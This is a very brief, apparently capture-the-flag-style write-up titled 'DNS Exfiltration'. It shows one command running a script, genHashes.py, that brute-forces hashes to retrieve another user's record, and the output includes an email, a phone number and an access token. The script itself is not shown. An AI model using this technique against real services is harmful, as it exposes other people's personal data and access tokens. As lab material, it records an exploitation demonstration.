# DNS Exfiltration
## Code exposed in frontend

## Exploit vulnerability

```bash
» python3 genHashes.py -e "a@a" -p "a" -n "john doe" -y 2018
[+] Logged in successfully!
[*] Brute-forcing hashes for john doe for the year 2018...
[+] User request successful!
Response: {'first_name': 'john', 'last_name': 'doe', 'email': 'johndoe@gmail.com', 'phone_number': '+00112233445566778899', 'access_token': 'J0HN_SUP3R_S3CR37_4CC355_70K3N'}
```
